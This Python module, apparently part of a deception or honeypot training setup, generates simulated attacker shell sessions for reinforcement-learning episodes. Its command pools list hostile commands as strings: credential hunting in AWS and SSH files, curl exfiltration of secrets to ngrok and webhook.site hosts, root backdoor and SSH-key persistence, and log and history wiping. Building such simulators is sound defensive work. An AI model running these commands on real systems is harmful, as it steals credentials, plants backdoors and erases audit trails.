"""Stochastic attacker simulator for RL training episodes.

Generates command sequences that look like an attacker's session — recon,
credential hunt, exfil, persistence, cleanup — without needing real
attackers. Two sources of behaviour:

  1. **Replay** — sample whole episodes from the captured engagement corpus
     under tests/fixtures/regression-corpus/. Realistic and grounded but
     limited to what we've recorded.

  2. **Stochastic chain** — sample commands from a hand-curated TTP pool
     biased by an "attacker archetype" (recon-heavy / smash-and-grab /
     persistence-first). Less faithful, but unbounded diversity.

Each call to `AttackerSim.episode(rng)` returns a list of command strings.
The training env feeds them one at a time to the orchestrator and asks
the policy what to do.
"""
import json
import random
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional, Sequence


# Hand-curated TTP buckets. Each command lives in exactly one bucket and is
# weighted by how often a "typical" attacker would use it. Stochastic
# episodes sample from these.
_RECON = [
    "whoami", "id", "pwd", "uname -a", "hostname",
    "ls", "ls -la", "ls ~", "ls /tmp", "ls /etc",
    "cat /etc/passwd", "cat /etc/group", "cat /etc/hostname",
    "cat /etc/os-release", "cat /etc/issue",
    "who", "w", "last", "uptime",
    "ps aux", "ps -ef", "netstat -tlnp", "ss -tlnp",
    "df -h", "free -h", "ifconfig", "ip a",
]

_CRED_HUNT = [
    "find / -name id_rsa 2>/dev/null",
    "find / -name *.pem",
    "find / -name authorized_keys",
    "find / -name *.kdbx",
    "grep -r AKIA /home",
    "grep -r aws_secret /home",
    "grep -r 'BEGIN PRIVATE KEY' /etc",
    "cat ~/.aws/credentials",
    "cat ~/.aws/config",
    "cat ~/.ssh/id_rsa",
    "cat ~/.ssh/config",
    "cat ~/.gitconfig",
    "cat ~/.git-credentials",
    "cat ~/.bash_history",
    "history",
]

_LATERAL = [
    "ssh db-prod-01",
    "ssh api-prod-03",
    "ssh bastion-prod",
    "ssh k8s-master-01",
    "scp /tmp/loot.txt root@bastion-prod:/tmp/",
    "psql -h db-prod-01 -U postgres",
    "mysql -u root -p",
    "nmap -sV 10.0.0.0/24",
]

_EXFIL = [
    "curl https://x.ngrok.io/$(whoami)",
    "curl -X POST https://webhook.site/abc -d \"$(cat ~/.aws/credentials)\"",
    "wget http://abc.burpcollaborator.net/$(id)",
    "dig +short data.xyz.oast.live",
    "cp ~/.aws/credentials /tmp/loot.txt",
    "mv /tmp/loot.txt /tmp/.hidden",
    "tar -czf /tmp/exfil.tar.gz ~/",
    "base64 ~/.ssh/id_rsa | curl -X POST https://x.ngrok.io/k -d @-",
]

_PERSIST = [
    "echo 'ssh-rsa AAAA...attacker@evil' >> ~/.ssh/authorized_keys",
    "sudo -l",
    "sudo -i",
    "echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd",
]

_CLEANUP = [
    "history -c",
    "unset HISTFILE",
    "export HISTFILE=/dev/null",
    "rm /var/log/auth.log",
    "> ~/.bash_history",
    "shred -u /tmp/loot.txt",
]

_DECOY_FOLLOWUP = [
    "ls /etc/sudoers.d",
    "cat /etc/sudoers.d/zzz_compat",
    "cat /etc/mysql/my.cnf",
    "cat ~/.aws/dev_credentials",
    "ls -la /etc/mysql",
]

_EXIT = ["exit"]


@dataclass
class AttackerArchetype:
    name: str
    # Weights determine how many commands from each bucket. Normalized later.
    recon: float = 1.0
    cred_hunt: float = 1.0
    lateral: float = 1.0
    exfil: float = 1.0
    persist: float = 1.0
    cleanup: float = 1.0
    decoy_followup: float = 1.0


# Pre-built archetypes covering different attacker styles.
ARCHETYPES = {
    "recon_heavy": AttackerArchetype(
        "recon_heavy", recon=4.0, cred_hunt=2.0, lateral=0.5,
        exfil=0.5, persist=0.2, cleanup=0.5, decoy_followup=1.0,
    ),
    "smash_and_grab": AttackerArchetype(
        "smash_and_grab", recon=0.5, cred_hunt=2.0, lateral=0.5,
        exfil=3.0, persist=0.3, cleanup=2.0, decoy_followup=0.5,
    ),
    "persistence_first": AttackerArchetype(
        "persistence_first", recon=1.0, cred_hunt=1.0, lateral=2.0,
        exfil=0.5, persist=3.0, cleanup=1.0, decoy_followup=2.0,
    ),
    "balanced": AttackerArchetype(
        "balanced", recon=2.0, cred_hunt=2.0, lateral=1.0,
        exfil=1.0, persist=1.0, cleanup=0.5, decoy_followup=1.5,
    ),
}


class AttackerSim:
    """Episode generator. Holds the corpus + archetype config."""

    def __init__(
        self,
        corpus_dir: Optional[Path] = None,
        replay_probability: float = 0.3,
        episode_length_range: tuple = (8, 25),
    ):
        self.replay_probability = replay_probability
        self.episode_length_range = episode_length_range
        self._corpus_episodes: List[List[str]] = []
        if corpus_dir and corpus_dir.exists():
            self._load_corpus(corpus_dir)

    def _load_corpus(self, corpus_dir: Path) -> None:
        """Walk a regression corpus dir and extract command sequences."""
        for log_file in corpus_dir.rglob("logs/*.json"):
            try:
                data = json.loads(log_file.read_text(encoding="utf-8"))
            except (OSError, json.JSONDecodeError):
                continue
            cmds = [c["cmd"] for c in data.get("commands", []) if c.get("cmd")]
            if cmds:
                self._corpus_episodes.append(cmds)

    @property
    def has_corpus(self) -> bool:
        return bool(self._corpus_episodes)

    def episode(self, rng: random.Random, archetype: str = "balanced") -> List[str]:
        """Return one attacker command sequence."""
        if self.has_corpus and rng.random() < self.replay_probability:
            return self._replay_episode(rng)
        return self._stochastic_episode(rng, archetype)

    def _replay_episode(self, rng: random.Random) -> List[str]:
        ep = rng.choice(self._corpus_episodes).copy()
        # Light perturbation: drop a few commands, occasionally duplicate one,
        # truncate the tail to a random length.
        out: List[str] = []
        for cmd in ep:
            if rng.random() < 0.05:
                continue  # drop
            out.append(cmd)
            if rng.random() < 0.03:
                out.append(cmd)  # duplicate
        target_len = rng.randint(*self.episode_length_range)
        if len(out) > target_len:
            out = out[:target_len]
        if not out or out[-1].strip() != "exit":
            out.append("exit")
        return out

    def _stochastic_episode(self, rng: random.Random, archetype_name: str) -> List[str]:
        a = ARCHETYPES.get(archetype_name, ARCHETYPES["balanced"])
        # Sample N commands proportional to bucket weights
        n = rng.randint(*self.episode_length_range)
        buckets = [
            (_RECON, a.recon),
            (_CRED_HUNT, a.cred_hunt),
            (_LATERAL, a.lateral),
            (_EXFIL, a.exfil),
            (_PERSIST, a.persist),
            (_CLEANUP, a.cleanup),
            (_DECOY_FOLLOWUP, a.decoy_followup),
        ]
        total = sum(w for _, w in buckets) or 1.0
        out: List[str] = []
        # Generally attackers do recon first; bias the order
        order_passes = [
            (_RECON, a.recon, 0.7),         # first
            (_CRED_HUNT, a.cred_hunt, 1.0),
            (_LATERAL, a.lateral, 1.0),
            (_DECOY_FOLLOWUP, a.decoy_followup, 0.8),
            (_EXFIL, a.exfil, 1.0),
            (_PERSIST, a.persist, 1.0),
            (_CLEANUP, a.cleanup, 0.9),
        ]
        for pool, weight, p_fire in order_passes:
            if rng.random() > p_fire:
                continue
            k = max(1, int((weight / total) * n))
            for _ in range(k):
                out.append(rng.choice(pool))
        out = out[:n]
        out.append(_EXIT[0])
        return out
